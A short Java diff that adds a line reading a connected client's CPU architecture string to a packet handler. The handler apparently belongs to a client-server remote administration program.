@@ -11,6 +11,7 @@ public class Packet16InitOperatingSystem extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		slave.setOperatingSystem(slave.readLine());
 		slave.setLongOperatingSystem(slave.readLine());
+		slave.setArch(slave.readLine());
 	}
 
 }
